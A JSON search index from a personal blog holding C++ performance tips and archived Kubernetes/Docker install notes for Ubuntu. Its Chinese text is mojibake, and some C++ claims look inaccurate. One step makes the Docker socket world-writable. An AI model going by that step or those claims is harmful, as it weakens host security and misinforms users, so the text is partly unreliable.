{"meta":{"title":"Racle`s Story","subtitle":"Recording & Thinking & Story telling","description":"ä¸ªäººåšå®¢&ç¬”è®°","author":"æ±Ÿå·¦æ—¶é›¨","url":"https://racleray.github.io","root":"/"},"pages":[{"title":"404","date":"2021-09-05T09:04:04.000Z","updated":"2023-08-07T11:54:31.022Z","comments":false,"path":"404/index.html","permalink":"https://racleray.github.io/404/index.html","excerpt":"","text":""},{"title":"About","date":"2021-09-05T08:58:08.000Z","updated":"2024-02-24T08:52:45.050Z","comments":false,"path":"about/index.html","permalink":"https://racleray.github.io/about/index.html","excerpt":"","text":"Recording &amp; Thinking &amp; Story telling é¥­è¦å¥½å¥½åƒï¼Œæ°´è¦æ…¢æ…¢å–ï¼ŒéŸ³ä¹è¦é™é™åœ°å¬ï¼Œè¯»ä¹¦è¦è®¤çœŸåœ°è¯»ã€‚ ç­‰å¾…ï¼Œç‹®å­èº«ä¸Šï¼Œè½æ»¡éº»é›€ã€‚ ç„¶åå‘ç°ï¼Œåªæœ‰æ‰€è°“çš„åŸåˆ™ï¼Œæ‰ä¼šçœŸæ­£å¸¦æ¥å†…å¿ƒçš„å¹³é™ã€‚"},{"title":"Contact","date":"2021-09-05T09:00:44.000Z","updated":"2023-08-07T11:54:31.051Z","comments":false,"path":"contact/index.html","permalink":"https://racleray.github.io/contact/index.html","excerpt":"","text":""},{"title":"Categories","date":"2020-04-15T12:18:06.000Z","updated":"2023-08-07T11:54:31.051Z","comments":false,"path":"categories/index.html","permalink":"https://racleray.github.io/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2020-04-15T12:18:26.000Z","updated":"2023-08-07T11:54:31.052Z","comments":false,"path":"tags/index.html","permalink":"https://racleray.github.io/tags/index.html","excerpt":"","text":""},{"title":"talking","date":"2021-11-01T05:08:08.000Z","updated":"2023-08-07T11:54:31.052Z","comments":false,"path":"talking/index.html","permalink":"https://racleray.github.io/talking/index.html","excerpt":"","text":""}],"posts":[{"title":"C++Tips","slug":"C-Tips-1","date":"2025-10-15T14:43:36.613Z","updated":"2025-10-15T14:47:43.010Z","comments":true,"path":"posts/d6af6a50.html","link":"","permalink":"https://racleray.github.io/posts/d6af6a50.html","excerpt":"C++ tips recently, C++ æŠ½è±¡ä»£ä»·","text":"photo by ğŸ§”â€â™‚ï¸ Michal KmeÅ¥(https://unsplash.com/@mitko?utm_source=templater_proxy&amp;utm_medium=referral) on Unsplash|990x657 [!quote] Intuition is the supra-logic that cuts out all the routine processes of thought and leaps straight from the problem to the answer. â€” Robert Graves C++çš„é›¶æˆæœ¬æŠ½è±¡ç›¸å…³æ¦‚å¿µéœ€è¦æ³¨æ„çš„ç‚¹ã€‚C++è¦è¾¾åˆ°è¿è¡Œæ—¶é¢å¤–å¼€é”€ï¼Œè¾¾åˆ°é›¶æˆæœ¬æ‰§è¡Œä»£ç é€»è¾‘ï¼Œéœ€è¦é¢å¤–æ³¨æ„ä»£ç å†™æ³•ï¼ˆè‡ªç”±çš„ä»£ä»·ï¼‰ã€‚ è™šå‡½æ•° è™šå‡½æ•°çš„ä»£ä»·ï¼š - è™šå‡½æ•°è¡¨ä¸­è½¬ï¼Œå¤šä¸€æ¬¡å¯»å€ - é—´æ¥è°ƒç”¨å‡½æ•°ï¼Œå¯èƒ½å½±å“åˆ†æ”¯é¢„æµ‹ï¼Œå¯¼è‡´é™ä½CPUæŒ‡ä»¤æµæ°´çº¿æ‰§è¡Œæ•ˆç‡ï¼ˆå½“ç„¶ï¼Œè¿™éœ€è¦çœ‹å®é™…åœºæ™¯ï¼Œä»¥åŠç¼–è¯‘å™¨ä¼˜åŒ–ï¼‰ - æ— æ³•å†…è”ï¼Œè¿™æ˜¯æœ€è‡´å‘½çš„ å¦‚æœåªæ˜¯éœ€è¦å¤šæ€ç‰¹æ€§ï¼Œå¦‚æœåˆ©ç”¨ç¼–è¯‘å™¨å¤šæ€ä¸å¤ªéº»çƒ¦ï¼Œé‚£ä¹ˆæ˜¯ä¸€ç§æå‡æ‰§è¡Œæ•ˆç‡çš„æ–¹æ³•ã€‚ éšè—æ‹·è´ å¯¹äºéå¹³å‡¡ç±»å‹ï¼ˆtrivialï¼Œæ¶‰åŠå †å†…å­˜åˆ†é…ï¼Œä¸åªæœ‰åŸºç¡€æ•°å€¼ç±»å‹ï¼‰ï¼Œåœ¨ member initialization ä¸­éœ€è¦æ³¨æ„å†™æ³• 123456class A &#123; public: A(B b): b_(std::move(b)) &#123;&#125; private: B b_;&#125; å¦‚æœä¸æ˜¯ moveï¼Œé‚£ä¹ˆb ä¼šåœ¨ä¼ å‚æ—¶æ„é€ ä¸€æ¬¡ï¼ŒAæ„é€ æ—¶ï¼Œå†æ„é€ ä¸€æ¬¡ã€‚ å¯¹äº for å¾ªç¯éå†å¤æ‚ç±»å‹çš„å®¹å™¨ï¼Œæ³¨æ„ä½¿ç”¨ type&amp;ï¼Œè€Œä¸æ˜¯ typeã€‚ å¯¹äº lambda æ•è·ï¼Œæ³¨æ„ä½¿ç”¨ &amp;val æˆ–è€… std::move(val) (&gt;=C++14)ã€‚ å¯¹äºå¤æ‚ç±»å‹ï¼Œæ³¨æ„å‘ç”Ÿéšå¼ç±»å‹è½¬æ¢ï¼Œæ¯”å¦‚ï¼š 1234std::unordered_map&lt;int, std::string&gt; map;for(const std::pair&lt;int, std::string&gt;&amp; p: map)&#123; ...&#125; è¿™æ®µä»£ç ç”¨äº†constå¼•ç”¨ï¼Œä½†æ˜¯å› ä¸ºç±»å‹é”™äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¼šå‘ç”Ÿæ‹·è´ï¼Œå› ä¸ºunordered_map elementçš„ç±»å‹æ˜¯std::pair&lt;const int, std::string&gt;ï¼Œè€Œä¸æ˜¯ä»£ç ä¸­å£°æ˜çš„ std::pair&lt;int, std::string&gt; çš„ const &amp;ã€‚ 1. for å¾ªç¯ä» map ä¸­å–å‡ºä¸€ä¸ªå…ƒç´ ï¼Œè¿™ä¸ªå…ƒç´ çš„çœŸå®ç±»å‹æ˜¯ const std::pair&lt;const int, std::string&gt;&amp;ã€‚ 2. ç¼–è¯‘å™¨å‘ç°éœ€è¦å°†è¿™ä¸ªå…ƒç´ ç»‘å®šåˆ°ä½ çš„å¼•ç”¨å˜é‡ p ä¸Šã€‚ 3. ä½†æ˜¯ï¼Œconst std::pair&lt;int, std::string&gt;&amp; å’Œ const std::pair&lt;const int, std::string&gt;&amp; æ˜¯ä¸¤ç§ä¸åŒçš„ç±»å‹ã€‚ä¸€ä¸ªéconstçš„å¼•ç”¨ä¸èƒ½ç»‘å®šåˆ°ä¸€ä¸ªéœ€è¦ç±»å‹è½¬æ¢çš„å¯¹è±¡ä¸Šã€‚ 4. å› æ­¤ï¼Œç¼–è¯‘å™¨æ‰¾ä¸åˆ°åŒ¹é…çš„å¼•ç”¨ç»‘å®šè§„åˆ™ï¼Œå®ƒä¼šå°è¯•å¯»æ‰¾å…¶ä»–æ–¹å¼ã€‚å®ƒå‘ç°å¯ä»¥åˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„ã€ç±»å‹ä¸º std::pair&lt;int, std::string&gt; çš„å¯¹è±¡ã€‚ 5. ä¸ºäº†åˆ›å»ºè¿™ä¸ªä¸´æ—¶å¯¹è±¡ï¼Œç¼–è¯‘å™¨ä¼šè°ƒç”¨ std::pair çš„æ‹·è´æ„é€ å‡½æ•°ï¼Œå°† map ä¸­çš„åŸå§‹å…ƒç´ ï¼ˆstd::pair&lt;const int, std::string&gt;ï¼‰æ‹·è´åˆ°è¿™ä¸ªæ–°çš„ä¸´æ—¶å¯¹è±¡ä¸­ã€‚ æ‰€ä»¥åœ¨éå†æ—¶ï¼Œæ¨èä½¿ç”¨const auto&amp;ï¼Œå¯¹äºmapç±»å‹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç»“æ„åŒ–ç»‘å®šã€‚ ç»“æ„åŒ–ç»‘å®šï¼ˆStructured Bindingï¼‰æ˜¯ C++17 å¼•å…¥çš„ä¸€ä¸ªéå¸¸æ–¹ä¾¿çš„ç‰¹æ€§ï¼Œåœ¨ python ä¸­å¾ˆå¸¸è§ã€‚ 1for (const auto&amp; [key, value] : map) &#123; ... &#125; éšå¼ææ„ ä½¿ç”¨ RAII ä»¥åŠä½œç”¨åŸŸè‡ªåŠ¨ææ„æ—¶ï¼Œéœ€è¦æ„è¯†åˆ°ï¼Œè¢«è‡ªåŠ¨è°ƒç”¨çš„ææ„å‡½æ•°ï¼Œä¹Ÿè®¸ä¼šå¼•å…¥å½“å‰ä»£ç ä¹‹å¤–çš„é¢å¤–å¼€é”€ã€‚ æ¯”å¦‚ï¼Œä¸€ä¸ªä»£ç å—ä¸­ï¼ŒæŸä¸€ä¸ªå¯¹è±¡ææ„æ—¶éœ€è¦åšè®¡æ—¶ï¼Œèµ„æºå›æ”¶ç­‰åŠ¨ä½œï¼Œé‚£ä¹ˆï¼Œè°ƒç”¨è€…éœ€è¦æ—¶åˆ»æé†’è‡ªå·±ï¼Œä¸è¦å¿˜è®°è¿™éƒ¨åˆ†å¼€é”€ã€‚å¦‚æœå¯ä»¥ç¼“å­˜ç‰¹æ®Šå¯¹è±¡ï¼Œä»¥å¤ç”¨ï¼Œé‚£ä¹ˆç¼“å­˜å®ƒã€‚ å¹³å‡¡ææ„è¯·ä½¿ç”¨ = default 123456789101112131415class A &#123; public: int i; int j; ~A() &#123;&#125;;&#125;;// orclass A &#123; public: int i; int j; ~A() = default;&#125;; å‰ä¸€ä¸ªå®ç°ä¸­ï¼Œé default çš„ nontrivial ç±»å‹ææ„ï¼Œå¦‚æœåŠ å…¥ {} ææ„ï¼Œå¯èƒ½å¯¼è‡´ç¼–è¯‘å™¨ä¼˜åŒ–å¤±æ•ˆï¼Œä¿ç•™äº†æ— æ„ä¹‰çš„èµ‹å€¼æŒ‡ä»¤ã€‚æ— è®ºæ˜¯å¦æ˜¯ç¼–è¯‘å™¨å·®å¼‚ï¼Œå»ºè®®ä½¿ç”¨åä¸€ç§ã€‚ shared_ptr éå¿…è¦ä¸è¦æ— è„‘ç”¨ å…³äºC++ä¸­æŒ‡é’ˆçš„ä½¿ç”¨æŒ‡å¯¼æ„è§æ˜¯ï¼š 1. ä¸æ¶‰åŠèµ„æºæ‰€æœ‰æƒæ—¶ï¼Œä½¿ç”¨è£¸æŒ‡é’ˆã€‚ 2. ä½¿ç”¨ unique_ptr æˆ–è€… shared_ptr éƒ½å¼•å…¥èµ„æºæ‰€æœ‰æƒç®¡ç†ã€‚ 3. é™¤ééœ€è¦å…±äº«èµ„æºæ‰€æœ‰æƒï¼Œå¦åˆ™ä½¿ç”¨ unique_ptrã€‚ shared_ptr çš„æ„é€ /å¤åˆ¶/ææ„ï¼Œæ¶‰åŠåŸå­æ“ä½œï¼Œä¼šæ¯”è£¸æŒ‡é’ˆå’Œ unique_ptr æ…¢ 10%åˆ°20%ã€‚shared_ptr ä¹Ÿè¦å°½é‡é¿å…æ‹·è´ã€‚ std::shared_ptr ä¸€å®šè¦ä½¿ç”¨std::make_shared&lt;T&gt;()è€Œä¸æ˜¯std::shared_ptr&lt;T&gt;(new T)æ¥æ„é€ ï¼Œå› ä¸ºåè€…ä¼šåˆ†é…ä¸¤æ¬¡å†…å­˜ï¼Œä¸”åŸå­è®¡æ•°å’Œæ•°æ®æœ¬èº«çš„å†…å­˜æ˜¯ä¸æŒ¨ç€çš„ï¼Œä¸åˆ©äºcpuç¼“å­˜ã€‚ å¦‚æœä¸æ˜¯å› ä¸ºæ‡’ï¼Œé‚£ä¹ˆä½¿ç”¨ shared_ptr å¸¸è§åœºæ™¯æ˜¯ï¼šç¼“å­˜ï¼Œå¼‚æ­¥èµ„æºææ„ã€‚ std::functionå’Œstd::any ä»£ä»· ç±»å‹æ“¦é™¤ç±»å‹åœ¨ C++ ä¸­æ˜¯æœ‰ä»£ä»·çš„ï¼š 1. std::functionè¦å ç”¨32ä¸ªå­—èŠ‚ï¼Œè€Œå‡½æ•°æŒ‡é’ˆåªéœ€è¦8ä¸ªå­—èŠ‚ 2. std::functionæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè™šå‡½æ•°è°ƒç”¨ï¼Œå› æ­¤è™šå‡½æ•°çš„é—®é¢˜std::functionéƒ½æœ‰ï¼Œæ— æ³•å†…è” 3. std::functionå¯èƒ½æ¶‰åŠå †å†…å­˜åˆ†é…ï¼Œæ¯”å¦‚ç”¨lambdaæ•è·æ—¶ï¼Œç”¨std::functionå°è£…ä¼šéœ€è¦åœ¨å †ä¸Šåˆ†é…å†…å­˜ é™¤äº†ä½œä¸ºå­˜å‚¨ä¸ç¡®å®šç±»å‹çš„å‡½æ•°ï¼Œå…¶å®ƒä¸æ¨èä½¿ç”¨ã€‚å¦‚æœéœ€è¦å¤šæ€å‡½æ•°è°ƒç”¨ï¼Œå»ºè®®ä½¿ç”¨ç¼–è¯‘é™æ€æ¨¡æ¿åˆ†å‘ã€‚ std::anyåŒç†ï¼Œä¹Ÿä¸æ¨èä½œä¸ºä¸ç¡®å®šç±»å‹å­˜å‚¨ä¹‹å¤–çš„å…¶å®ƒç”¨é€”ã€‚ std::variantå’Œstd::optional ä»£ä»· å¤šä½™å†…å­˜å¼€é”€ï¼šstd::optionalæœ‰ä¸¤ä¸ªæˆå‘˜å˜é‡ï¼Œç±»å‹åˆ†åˆ«ä¸ºboolå’ŒTï¼Œç”±äºå†…å­˜å¯¹é½çš„åŸå› ï¼Œsizeof(std::optional)æœ€å¤šä¼šæ˜¯sizeof(T)çš„ä¸¤å€ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œrustè¯­è¨€çš„optionå®ç°åˆ™æœ‰null pointer optimizationï¼Œå³å¦‚æœä¸€ä¸ªç±»çš„åˆæ³•å†…å­˜è¡¨ç¤ºä¸€å®šä¸ä¼šå…¨éƒ¨å­—èŠ‚ä¸ºé›¶ï¼Œæ¯”å¦‚std::reference_wrapperï¼Œé‚£å°±å¯ä»¥é›¶å¼€é”€åœ°è¡¨ç¤ºstd::optionalï¼Œè€ŒC++ç”±äºéœ€è¦å…¼å®¹Cçš„å†…å­˜å¯¹é½ï¼Œä¸å¯èƒ½å®ç°è¿™é¡¹ä¼˜åŒ– gcc 8.0.0 ä¹‹å‰ std::optional è¢«ä½œä¸º trivial ç±»å‹ï¼Œå¯¼è‡´ T å¦‚æœæ˜¯ nontrivial ï¼Œé‚£ä¹ˆå¿…é¡»ä¹Ÿæ˜¯ nontrivial çš„ std::optional å’Œ gcc å†²çªï¼Œå‡ºç°é—®é¢˜ã€‚ NRVO ä¸å‹å¥½ï¼ˆNRVO æ˜¯ï¼šå½“ä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼æ˜¯å½“å‰å‡½æ•°å†…çš„ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œä¸”è¯¥å±€éƒ¨å˜é‡çš„ç±»å‹å’Œè¿”å›å€¼ä¸€è‡´æ—¶ï¼Œç¼–è¯‘å™¨ä¼šå°†è¯¥å˜é‡ç›´æ¥åœ¨å‡½æ•°çš„è¿”å›å€¼æ¥æ”¶å¤„æ„é€ ï¼Œä¸ä¼šå‘ç”Ÿæ‹·è´å’Œç§»åŠ¨ï¼‰ 12345678910111213std::optional&lt;A&gt; f() &#123; A v = A(); return v;&#125;// åº”è¯¥æ”¹ä¸º```cppstd::optional&lt;A&gt; f() &#123; std::optional&lt;A&gt; v; v = A(); return v;&#125; 1234567### std::asyncå¦‚æœ async ä½¿ç”¨äº†é»˜è®¤çš„ std::launch::deferred policy æ‰§è¡Œï¼Œé‚£ä¹ˆä¸ä¼šå¼‚æ­¥æ‰§è¡Œï¼Œè€Œæ˜¯åœ¨ future.get() æ˜¯æ‰å¼€å§‹å»¶è¿Ÿæ‰§è¡Œï¼Œå˜æˆåŒæ­¥è°ƒç”¨ã€‚async è¿”å›çš„ futureï¼Œå®ƒææ„æ—¶ï¼Œä¼šåŒæ­¥ç­‰å¾…å‡½æ•°è¿”å›ç»“æœæ‰ææ„ç»“æŸã€‚æ‰€ä»¥```cpp std::async(std::launch::async, func1); std::async(std::launch::async, func2); æ˜¯åŒæ­¥æ‰§è¡Œçš„ï¼Œè€Œ 12auto future1 = std::async(std::launch::async, func1);auto future2 = std::async(std::launch::async, func2); æ‰æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ã€‚ ç„¶åï¼Œstd::packaged_task å’Œ std::promise æ„é€ çš„ std::future å´ä¸ä¼šåœ¨ææ„æ—¶åŒæ­¥ç­‰å¾…ï¼Œéœ€è¦æ³¨æ„ã€‚ æ»¥ç”¨ std::move move åœ¨ä»¥ä¸‹åœºæ™¯ä¸‹æ— ç”¨ï¼š 1. å¯¹è±¡æ˜¯ nontrivial ç±»å‹ 2. å¯¹è±¡æ˜¯å¸¸é‡å¼•ç”¨ ä»¥ä¸‹åœºæ™¯ä¸‹ä¸ºå‰¯ä½œç”¨ï¼š - å½±å“ç¼–è¯‘å™¨ NRVO 1234A f() &#123; A v = A(); return std::move(v); // NRVO å¤±æ•ˆ&#125; å°¾é€’å½’ä¼˜åŒ– å¦‚æœæŸä¸ªå‡½æ•°çš„æœ€åä¸€æ­¥æ“ä½œæ˜¯è°ƒç”¨è‡ªèº«ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨å®Œå…¨å¯ä»¥ä¸ç”¨è°ƒç”¨çš„æŒ‡ä»¤(call)ï¼Œè€Œæ˜¯ç”¨è·³è½¬(jmp)å›å½“å‰å‡½æ•°çš„å¼€å¤´ï¼Œçœç•¥äº†æ–°å¼€è°ƒç”¨æ ˆçš„å¼€é”€ã€‚ C++ ä¸­ï¼Œååœ¨è¿è¡Œæ—¶éšå¼æ“ä½œï¼Œæ¯”å¦‚ææ„å‡½æ•°ã€‚ 123456789unsigned btd_tail(std::string input, int v) &#123; if (input.empty()) &#123; return v; &#125; else &#123; v = v * 2 + (input.front() - '0'); // input.~string(); return btd_tail(input.substr(1), v); &#125;&#125; æ­¤å¤„ï¼Œç”±äº input.~string() è¿™ä¸ª trivial ææ„çš„å­˜åœ¨ï¼Œä¸å¯å¹³å‡¡ææ„ï¼Œå¯¼è‡´å°¾é€’å½’å¤±æ•ˆï¼ˆæœ‰å‰¯ä½œç”¨ï¼‰ã€‚ å¦‚æœæ¢æˆ std::string_viewï¼Œè¿™ä¸ªå¯ä»¥ å¹³å‡¡ææ„ çš„ nontrivial ç±»å‹ï¼Œç¼–è¯‘å™¨æ ¹æœ¬ä¸éœ€è¦è°ƒç”¨ææ„å‡½æ•°ï¼Œåˆ™ä¸å½±å“å°¾é€’å½’ä¼˜åŒ–ã€‚ 12345678unsigned btd_tail(std::string_view input, int v) &#123; if (input.empty()) &#123; return v; &#125; else &#123; v = v * 2 + (input.front() - '0'); return btd_tail(input.substr(1), v); &#125;&#125; å‘é‡åŒ– ç¼–è¯‘å™¨ä¸€èˆ¬ä¼šåˆ©ç”¨ç°ä»£CPUçš„å‘é‡åŒ–æŒ‡ä»¤å¦‚ SSE/AVX ç­‰ SIMD æ“ä½œæŒ‡ä»¤ã€‚ä½†æ˜¯å­˜åœ¨æ¡ä»¶ï¼š 1. å¾ªç¯å†…éƒ¨è®¿é—®è¿ç»­å†…å­˜ 2. æ²¡æœ‰ if åˆ†æ”¯ 3. å¾ªç¯ä¹‹é—´æ²¡æœ‰ä¾èµ– æ¯”å¦‚ï¼š 123456789101112131415enum Type &#123; kAdd, kMul &#125;;int add(int a, int b) &#123; return a + b; &#125;int mul(int a, int b) &#123; return a * b; &#125;std::vector&lt;int&gt; func(std::vector&lt;int&gt; a, std::vector&lt;int&gt; b, Type t) &#123; std::vector&lt;int&gt; c(a.size()); for (int i = 0; i &lt; a.size(); ++i) &#123; if (t == kAdd) &#123; c[i] = add(a[i], b[i]); &#125; else &#123; c[i] = mul(a[i], b[i]); &#125; &#125; return c;&#125; å¯ä»¥ä¼˜åŒ–æ‰ if åˆ†æ”¯ï¼Œä»¥åŠä½¿ç”¨å†…è”å‡½æ•°ï¼š 12345678910111213141516enum Type &#123; kAdd, kMul &#125;;inline __attribute__((always_inline)) int add(int a, int b) &#123; return a + b; &#125;inline __attribute__((always_inline)) int mul(int a, int b) &#123; return a * b; &#125;template &lt;Type t&gt;std::vector&lt;int&gt; func(std::vector&lt;int&gt; a, std::vector&lt;int&gt; b) &#123; std::vector&lt;int&gt; c(a.size()); for (int i = 0; i &lt; a.size(); ++i) &#123; if constexpr (t == kAdd) &#123; c[i] = add(a[i], b[i]); &#125; else &#123; c[i] = mul(a[i], b[i]); &#125; &#125; return c;&#125; ä½¿ç”¨æ¨¡æ¿ï¼Œå®ç°ç¼–è¯‘æœŸåˆ†æ”¯ä¼˜åŒ–ã€‚ End C++ çš„è‡ªç”±åº¦ï¼Œä¸€å®šç¨‹åº¦ä¸Šä½¿å¾—é«˜æ€§èƒ½æ²¡é‚£ä¹ˆå®¹æ˜“å®ç°ï¼Œä½†æ˜¯ä¹Ÿæ­£æ˜¯å› ä¸ºå®ƒçš„çµæ´»æ€§ï¼Œè®©æˆ‘æ›´å–œæ¬¢è¿™é—¨è¯­è¨€ï¼Œè€Œä¸æ˜¯ç›®å‰å¸¸ç”¨çš„ Rustã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"}],"author":"HeRui"},{"title":"k8s_archive","slug":"k8s-archive","date":"2025-09-19T15:08:29.000Z","updated":"2025-09-20T07:02:55.306Z","comments":true,"path":"posts/6eeefec4.html","link":"","permalink":"https://racleray.github.io/posts/6eeefec4.html","excerpt":"k8s ä»¥å‰çš„ç¯å¢ƒè®°å½• archive","text":"Ubuntu 24.04 docker installl 1sudo vim /etc/apt/sources.list.d/ubuntu.sources 1234567891011121314151617181920212223242526Types: debURIs: http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F;Suites: noble noble-updates noble-securityComponents: main restricted universe multiverseSigned-By: &#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;ubuntu-archive-keyring.gpgTypes: debURIs: http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F;Suites: noble noble-updates noble-securityComponents: main restricted universe multiverseSigned-By: &#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;ubuntu-archive-keyring.gpgTypes: debURIs: http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;Suites: noble noble-updates noble-securityComponents: main restricted universe multiverseSigned-By: &#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;ubuntu-archive-keyring.gpgTypes: debURIs: http:&#x2F;&#x2F;mirrors.163.com&#x2F;ubuntu&#x2F;Suites: noble noble-updates noble-securityComponents: main restricted universe multiverseSigned-By: &#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;ubuntu-archive-keyring.gpg 123456789101112131415161718for pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do apt-get remove $pkg; doneapt-get updateapt-get install ca-certificates curl gnupginstall -m 0755 -d /etc/apt/keyringscurl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpgsudo chmod a+r /etc/apt/keyrings/docker.gpgecho \\ \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \\ \"$(. /etc/os-release &amp;&amp; echo \"$VERSION_CODENAME\")\" stable\" | \\ tee /etc/apt/sources.list.d/docker.list &gt; /dev/nullapt-get updateapt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin reference: docker-ce | é•œåƒç«™ä½¿ç”¨å¸®åŠ© | æ¸…åå¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™ | Tsinghua Open Source Mirror docker without root 123456sudo cat /etc/group | grep dockersudo groupadd dockersudo gpasswd -a $&#123;USER&#125; dockersudo chmod a+rw /var/run/docker.socksudo systemctl restart docker docker mirror 1234567sudo tee /etc/docker/daemon.json &lt;&lt;EOF&#123; \"registry-mirrors\": [ \"https://docker.xuanyuan.me\" ]&#125;EOF reference 1 https://linuxmirrors.cn/docker.sh reference 2 å›½å†…ä¸»æµ Docker Hub é•œåƒåŠ é€Ÿç«™æ¸…å• åœ°å€ è¿è¥æ–¹ ç±»å‹ è¯´æ˜ https://docker.xuanyuan.me è½©è¾•é•œåƒå…è´¹ç‰ˆ Cloudflare+å›½å†…CDN å®˜ç½‘æ”¯æŒæœç´¢é•œåƒã€é…ç½®ç®€å•ã€æœ‰ä¼šå‘˜è§£ç­”ç¾¤ã€å±è”½è¿æ³•å†…å®¹ã€å¢ƒå†…å…¬å¸è¿è¥ï¼ˆéå¸¸ç¨³å®šï¼‰ https://xuanyuan.cloud è½©è¾•é•œåƒä¸“ä¸šç‰ˆ å›½å†…CDN éœ€è¦ç™»å½•ï¼Œé€Ÿåº¦ç¨³å®šï¼Œæ”¯æŒçˆ±å¿«ï¼Œç¾¤æ™–ï¼Œæç©ºé—´ï¼Œå¨è”é€š nasï¼Œæ”¯æŒæœç´¢é•œåƒã€é…ç½®ç®€å•ã€æœ‰ä¼šå‘˜è§£ç­”ç¾¤ã€å±è”½è¿æ³•å†…å®¹ã€å¢ƒå†…å…¬å¸è¿è¥ï¼ˆéå¸¸ç¨³å®šï¼‰ https://mirror.ccs.tencentyun.com è…¾è®¯äº‘ å›½å†…CDN ä»…è…¾è®¯äº‘æœåŠ¡å™¨å†…æ¨èä½¿ç”¨ https://xxx.mirror.aliyuncs.com é˜¿é‡Œäº‘ å›½å†…CDN ä»…é˜¿é‡Œäº‘æœåŠ¡å™¨å†…æ¨èä½¿ç”¨ï¼ˆhttps://help.aliyun.com/zh/acr/user-guide/accelerate-the-pulls-of-docker-official-images?spm=a2c4g.11186623.0.i7ï¼‰ https://1ms.run/ æ¯«ç§’é•œåƒ Cloudflareã€å¢ƒå†…CDN å…è´¹ã€æä¾›åœ¨çº¿æŠ€æœ¯æ”¯æŒã€é•¿æœŸç»´æŠ¤ã€å®Œæ•´æ–‡æ¡£ã€æ´»è·ƒç¤¾åŒºã€‚ cri-dockerd Releases Â· Mirantis/cri-dockerd ä¸ç”¨dockerï¼Œå¯é€‰çš„ cri æœ‰ containerd (unix:///run/containerd/containerd.sock)ï¼Œå’Œ CRI-O 1234567891011121314151617181920212223242526272829303132333435363738394041424344cat &gt; /etc/systemd/system/cri-dockerd.service&lt;&lt;-EOF[Unit]Description=CRI Interface for Docker Application Container EngineDocumentation=https://docs.mirantis.comAfter=network-online.target firewalld.service docker.serviceWants=network-online.targetRequires=cri-dockerd.socket #system cri-dockerd.socket [Service]Type=notifyExecStart=/usr/local/bin/cri-dockerd --pod-infra-container-image=registry.cn-hangzhou.aliyuncs.com/google_containers/pause --network-plugin=cni --cni-conf-dir=/etc/cni/net.d --cni-bin-dir=/opt/cni/bin --container-runtime-endpoint=unix:///var/run/cri-dockerd.sock --cri-dockerd-root-directory=/var/lib/dockershim --docker-endpoint=unix:///var/run/docker.sock --cri-dockerd-root-directory=/var/lib/dockerExecReload=/bin/kill -s HUP $MAINPIDTimeoutSec=0RestartSec=2Restart=alwaysStartLimitBurst=3StartLimitInterval=60sLimitNOFILE=infinityLimitNPROC=infinityLimitCORE=infinityTasksMax=infinityDelegate=yesKillMode=process[Install]WantedBy=multi-user.targetEOFcat &gt; /etc/systemd/system/cri-dockerd.socket &lt;&lt;-EOF[Unit]Description=CRI Docker Socket for the APIPartOf=cri-dockerd.service #systemd cri-dockerd.servics [Socket]ListenStream=/var/run/cri-dockerd.sockSocketMode=0660SocketUser=rootSocketGroup=docker [Install]WantedBy=sockets.targetEOF # ä»é˜¿é‡Œäº‘é•œåƒä»“åº“æ‹‰å– pause é•œåƒ sudo docker pull registry.aliyuncs.com/google_containers/pause:3.10 # é‡æ–°æ ‡è®°ä¸º k8s.io çš„é•œåƒ sudo docker tag registry.aliyuncs.com/google_containers/pause:3.10 registry.k8s.io/pause:3.10 # éªŒè¯é•œåƒ sudo docker images | grep pause if arch and pacman yay -S cri-dockerd-bin 123systemctl daemon-reloadsystemctl enable cri-dockerd.servicesystemctl restart cri-dockerd.service 1ls /var/run | grep docker 12345sudo systemctl enable --now dockersudo systemctl enable --now cri-dockerdsudo systemctl enable --now kubelet multi nodes 12345678910111213141516171819# åˆ†æœºå™¨sudo hostnamectl set-hostname \"k8smaster\"sudo hostnamectl set-hostname \"k8snode1\" sudo hostnamectl set-hostname \"k8snode2\"# ä¸åˆ†æœºå™¨cat &gt;&gt; /etc/hosts &lt;&lt; EOF192.168.31.224 k8smaster192.168.31.225 k8snode1192.168.31.226 k8snode2EOFtimedatectl set-timezone Asia/Shanghaisudo apt install -y ntpsec-ntpdatentpdate ntp.aliyun.comcrontab -e0 0 * * * ntpdate ntp.aliyun.com å†…æ ¸è½¬å‘å’Œç½‘æ¡¥è¿‡æ»¤ 12345678910111213141516171819202122cat &lt;&lt; EOF | tee /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables = 1net.ipv4.ip_forward = 1EOFmodprobe overlaymodprobe br_netfiltercat &lt;&lt; EOF | tee /etc/modules-load.d/k8s.confoverlaybr_netfilterEOFsysctl --systemsudo swapoff -asudo vim /etc/fstabæ³¨é‡Šæ‰ /dev/sda2 none swap sw 0 0 1&gt;apt install -y ipset ipvsadm ipvs stands for IP Virtual Server. It's a software-based load balancer that allows multiple network services to be presented to clients as a single virtual IP address. Key functions of 